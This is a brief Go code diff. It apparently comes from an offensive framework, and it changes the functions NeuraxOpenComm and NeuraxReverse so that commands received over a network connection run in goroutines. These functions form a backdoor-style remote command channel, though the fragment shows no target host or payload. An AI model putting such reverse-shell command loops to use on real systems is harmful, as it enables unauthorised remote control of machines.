@@ -246,7 +246,7 @@ func NeuraxOpenComm() {
 		buff := make([]byte, 1024)
 		len, _ := conn.Read(buff)
 		cmd := string(buff[:len-1])
-		handle_command(cmd)
+		go handle_command(cmd)
 		conn.Close()
 	}
 }
@@ -256,7 +256,7 @@ func NeuraxReverse() {
 	for {
 		command, _ := bufio.NewReader(conn).ReadString('\n')
 		command = strings.TrimSuffix(command, "\n")
-		handle_command(command)
+		go handle_command(command)
 	}
 }
 
